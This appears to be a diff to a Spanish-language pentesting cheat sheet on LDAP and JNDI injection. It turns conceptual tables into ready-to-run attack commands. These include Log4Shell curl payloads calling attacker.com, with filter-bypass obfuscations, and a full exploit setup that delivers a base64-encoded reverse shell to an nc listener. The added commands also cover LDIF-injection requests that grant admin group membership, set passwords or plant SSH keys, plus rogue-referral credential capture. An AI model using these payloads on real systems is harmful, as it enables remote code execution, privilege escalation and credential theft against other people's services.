@@ -26,40 +26,34 @@ linked:
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concept | Java Naming and Directory Interface (JNDI) lookup acepta LDAP URL → atacante hostea malicious LDAP server → entrega Java class → RCE en target | Log4Shell pattern. |
-| CVE-2021-44228 (Log4j) | `${jndi:ldap://attacker.com/Exploit}` en logged string | Most famous. |
-| Generic JNDI sink | `Context.lookup(userInput)` con LDAP URL | RCE. |
-| Spring `@Value` inject | `${jndi:ldap://...}` en config | Spring property. |
-| Logback variant | Similar a Log4j | Same family. |
-| Java EE `InitialContext` | `new InitialContext().lookup(input)` | EE container. |
-| OpenJPA / Hibernate | Reflection-based lookup | ORM gadgets. |
-| Variant `ldaps://` | Same idea con TLS | Same. |
-| Variant `dns://` | DNS lookup (less impact) | Probe canary. |
-| Variant `rmi://` | Java RMI server gadget | Same family. |
-| Variant `iiop://` | CORBA gadget | Edge. |
-| Bypass filter `${jndi:` | `${${env:NaN:-j}ndi:...}`, `${jndi${::-:}ldap://...}` | Filter evasion Log4Shell. |
-| Header reflection | `User-Agent: ${jndi:...}` reflected en logs | Common vector. |
-| Other reflected fields | URI, body, query params | Wide surface. |
-| Impact | Pre-auth RCE en stack Java | Critical. |
+| `curl -H 'User-Agent: ${jndi:ldap://attacker.com:1389/Exploit}' https://target/` | Pre-auth RCE Log4Shell-style | Backend Java loga User-Agent + Log4j ≤ 2.14. |
+| `curl -H 'X-Forwarded-For: ${jndi:ldap://attacker.com:1389/x}' https://target/` | Inject via XFF header | Headers loggeados. |
+| `curl -d 'username=${jndi:ldap://attacker.com:1389/x}&password=any' https://target/login` | Inject en body POST | Field reflejado en logs. |
+| `curl 'https://target/?q=${jndi:ldap://attacker.com:1389/x}'` | Inject en query param | URL en access logs. |
+| `curl -H 'User-Agent: ${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.com/x}' https://target/` | Bypass `${jndi:` filter naive | WAF strip pattern. |
+| `curl -H 'User-Agent: ${${env:NaN:-j}ndi:${env:NaN:-l}dap://attacker.com/x}' https://target/` | Env var nesting bypass | Filter más agresivo. |
+| `curl -H 'User-Agent: ${jndi:ldaps://attacker.com:636/x}' https://target/` | TLS variant | Outbound LDAPS only. |
+| `curl -H 'User-Agent: ${jndi:dns://attacker.com/x}' https://target/` | DNS canary (no RCE pero confirma) | Probe initial. |
+| `curl -H 'User-Agent: ${jndi:rmi://attacker.com:1099/x}' https://target/` | RMI variant | Si LDAP filtered. |
 ^ldap-jndi-lookup
 
 ### Log4Shell setup completo
 
 ```bash
-# 1. Atacante hostea LDAP server malicioso (con marshalsec o JNDI-Exploit-Kit)
+# 1. Atacante hostea LDAP server malicioso
 git clone https://github.com/welk1n/JNDI-Injection-Exploit
 cd JNDI-Injection-Exploit
-java -jar JNDIExploit-1.4-SNAPSHOT.jar -i attacker.com -p 1389
+mvn clean package -DskipTests
+java -jar target/JNDI-Injection-Exploit-*-all.jar \
+  -C "bash -c {echo,$(echo 'bash -i >& /dev/tcp/attacker/4444 0>&1' | base64 -w0)}|{base64,-d}|bash" \
+  -A attacker.com
 
-# 2. Enviar payload a target (any logged input)
-curl -H 'User-Agent: ${jndi:ldap://attacker.com:1389/Basic/Command/base64/<base64-cmd>}' \
+# 2. Listener
+nc -lvnp 4444
+
+# 3. Trigger payload (User-Agent reflejado en logs)
+curl -H 'User-Agent: ${jndi:ldap://attacker.com:1389/Basic/Command/Base64/<base64-cmd>}' \
      https://target/
-
-# 3. Target Java app loga User-Agent → Log4j evalúa expresión:
-#    - JNDI lookup ldap://attacker.com:1389/Basic/...
-#    - Atacante's LDAP server retorna entry con javaCodeBase y javaClassName
-#    - Target downloads class → executes
-#    - RCE
 ```
 
 ___
@@ -68,17 +62,12 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concept | App add/modify entries en LDAP. Atacante inyecta nuevo entry con malicious attributes | Persistent LDAP backdoor. |
-| Add user con admin attributes | LDIF inject `memberOf: CN=admins,...` | Privilege escalation. |
-| Override password | `userPassword: <attacker-hash>` | Password reset. |
-| Set `userPassword` to known | Atacante registers + modifies own pass to admin's known | Bypass for service accounts. |
-| Add SSH public key | `sshPublicKey` attribute (OpenLDAP+nss-ldap) → SSH access | OS-level access. |
-| Add Kerberos principal | AD `userPrincipalName` modify | UPN-based auth abuse. |
-| Modify display attributes | `cn: Admin User <admin@target>` | Phishing context. |
-| Inject group membership | Atacante adds self to admin group | Lateral movement. |
-| Service account creation | Create LDAP entry as service account | Persistence. |
-| Inject computer object | AD computer object con SPN | Kerberoast surface. |
-| Schema modification | If app permite schema admin | Disrupt directory. |
+| `ldapmodify -H ldaps://target -D "cn=admin,dc=target,dc=com" -w pass -f attacker.ldif` (con LDIF que add memberOf admin) | Privesc — agregar self a admin group | Atacante con bind valid. |
+| `curl --data-urlencode "displayName=John%0auserPassword: $2b$10$..." https://target/profile/update` | LDIF inject password | App escribe LDIF sin sanitización. |
+| `curl --data-urlencode "displayName=John%0amemberOf: cn=admins,dc=target,dc=com" https://target/profile/update` | Self-add a admin group via LDIF | Profile update vulnerable. |
+| `curl --data-urlencode "displayName=John%0asshPublicKey: ssh-rsa AAAAB..." https://target/profile/update` | Inject SSH key (nss-ldap) | OS-level access path. |
+| `ldapmodify -H ldap://target -x -D "cn=user,dc=target,dc=com" -w pass <<EOF\ndn: cn=user,dc=target,dc=com\nchangetype: modify\nadd: userPassword\nuserPassword: NEW\nEOF` | Direct password modify | Self-bind + modify own. |
+| `curl --data-urlencode "displayName=Admin <admin@target.com>%0aobjectClass: organizationalPerson" https://target/register` | Phishing-context display name | UI confusion. |
 ^ldap-jndi-entry
 
 ___
@@ -87,16 +76,12 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concept | LDAP referrals indicate query needs to be redirected to another server. Client follows referral, sending creds to atacante's server | Credential theft via referral. |
-| Atacante sets up rogue LDAP server | Server returns `searchResRef` con URL `ldap://attacker.com/...` | Standard. |
-| Target LDAP client follows | Client makes new bind con same creds → atacante captures | Plain creds. |
-| TLS downgrade via referral | Initial LDAPS → referral to LDAP (cleartext) | Downgrade attack. |
-| Forced referral via filter manipulation | Some servers respond con referral on certain queries | Server-side bug. |
-| OpenLDAP `chase referrals` setting | Default chase referrals = on | Vulnerable default. |
-| Active Directory referrals | Cross-domain queries return referrals automatically | AD inherent. |
-| Referral chain | Multiple referrals → atacante chain controls | Multi-stage. |
-| ManageDsaIT control | Bypass referral chasing en specific queries | Defense. |
-| Trust path discovery | Atacante mappea trust paths via referrals | Recon. |
+| `python3 -c "from ldaptor.protocols.pureldap import LDAPSearchResultReference; ..."` (LDAP server custom retornando referral) | Capturar creds del client en re-bind | Client con `chase referrals=on`. |
+| `slapd -h "ldap://0.0.0.0:389" -d 1` con config returning `ldap://attacker.com/` | Setup rogue LDAP server | Listener para referral chase. |
+| `tcpdump -i any -A 'port 389 or port 636' \| grep -E 'cn=\|password'` | Capturar plain creds en re-bind | Post-referral tcpdump. |
+| `ldapsearch -H ldap://target -x -D "cn=admin,..." -w pass -b "dc=target,dc=com"` con referral hijack | Force LDAP client to follow referral | Cross-domain query. |
+| `dig +short SRV _ldap._tcp.target.com` | Discover all DCs (referral targets) | AD multi-DC recon. |
+| `ldapsearch -H ldap://target -x -O "ManageDsaIT" -b "dc=target,dc=com"` | Disable referral chasing | Defense check. |
 ^ldap-jndi-referral
 
 ___
@@ -105,17 +90,12 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concept | LDAP schema defines attribute types con specific syntax (binary, integer, DN). Atacante exploita schema features para gadgets. | Advanced. |
-| Binary attribute upload | `jpegPhoto` accepts arbitrary binary | Storage vector. |
-| `description` exfil | Long descriptions can store data | Steganography. |
-| `userCertificate` field | Binary certs stored | Chain con cert misuse. |
-| `nsroleDN` (FreeIPA) | Role DN reference | Privesc. |
-| `secretary` attribute | DN reference attr | Indirect references. |
-| Custom schema attributes | Apps con custom schema → atacante injects | Per-app. |
-| `manager` attribute | DN-valued | Org chart manipulation. |
-| `seeAlso` attribute | DN reference | Search injection. |
-| `sambaPasswordHistory` | Samba schema | Password history exfil. |
-| Class hierarchy abuse | Add user to top class with all OPTIONAL attrs | Bypass class restrictions. |
+| `ldapmodify ... <<<"dn: cn=user,...\nchangetype: modify\nadd: jpegPhoto\njpegPhoto:< file:///path/payload.bin"` | Storage de payload binary | Atributo binario. |
+| `ldapmodify ... add: description\ndescription: <large-encoded-data>` | Steganography / data store | Atributo description amplio. |
+| `ldapmodify ... add: userCertificate\nuserCertificate;binary:< file:///cert.der"` | Cert malicioso storage | userCertificate binary attr. |
+| `curl --data-urlencode "displayName=user%0amanager: cn=victim,dc=target,dc=com" https://target/profile/update` | DN reference manipulation | manager attribute. |
+| `curl --data-urlencode "displayName=user%0aseeAlso: cn=admin,dc=target,dc=com" https://target/profile/update` | Search-time indirect ref | seeAlso DN. |
+| `ldapsearch -H ldap://target -b "" -s base "(objectClass=*)" "+ *"` | Schema enumeration completo | Pre-attack recon. |
 ^ldap-jndi-schema
 
 ***
